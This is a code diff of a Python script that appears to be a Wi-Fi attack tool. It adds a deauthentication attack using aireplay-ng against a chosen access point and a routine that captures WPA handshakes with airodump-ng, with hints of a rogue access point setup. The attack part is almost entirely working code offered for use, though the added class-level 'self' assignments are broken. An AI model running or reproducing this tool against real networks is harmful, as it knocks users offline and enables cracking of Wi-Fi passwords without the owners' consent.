@@ -10,6 +10,11 @@ TARGET = ""
 TARGET_FILE = "target_file.txt"
 
 class WfiRguAP:
+    self.interface = "wlan0"
+    self.target_bssid = None
+    self.target_essid = None
+    self.target_channel = None
+    self.capture_file = "handshake.cap"
     def monitor_mode(self):
         print(f"[+] We need interface to target : ")
         input(INTERFACE)
@@ -20,7 +25,7 @@ class WfiRguAP:
             subprocess.run(['airmon-ng', 'check', 'kill'], check=True)
             subprocess.run(['airmon-ng', 'start', INTERFACE], check=True)
             return f"{INTERFACE}"
-        except subprocess.CalledProcessErrora as e:
+        except subprocess.CalledProcessError as e:
             print(f"[-] Error during configuration of monitor mode")
             sys.exit(1)
 
@@ -39,6 +44,40 @@ class WfiRguAP:
         subprocess.run(['cat', TARGET_FILE])
         print(f"[+] Select target Network >")
         input(TARGET)
+
+    def deauth_attack(self, timeout=20):
+        print(f"[*] Launching Deauth Attack on {self.target_essid}")
+        try:
+            process = subprocess.Popen(
+                ['aireplay-ng', '--deauth', '10', '-a', self.target_bssid, self.interface],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True)
+
+            time.sleep(timeout)
+            process.terminate()
+            process.wait()
+
+            stdout, _ = process.communicate()
+
+            if "Sending DeAuth" in stdout:
+                print("[+] Deauth Attack succeeded")
+                return True
+            else:
+                print("[-] Deauth attack failed")
+                return False
+        except subprocess.CalledProcessError:
+            print("[-] Error during deauth attack")
+            sys.exit(1)
+    def capture_handshake(self):
+        print(f"[*] Capturing Handshake on {self.target_essid}")
+        try:
+            subprocess.Popen(['airodump-ng', '-c', self.target_channel, '--bssid', self.target_bssid, '-w', 'psk', self.interface])
+            input("Press enter to stop the process after the handshake is captured")
+            subprocess.run(['pkill', 'airodump-ng'])
+        except subprocess.CalledProcessError:
+            print("[-] Error during deauth attack")
+            sys.exit(1)
 
 
 def init_apache2():
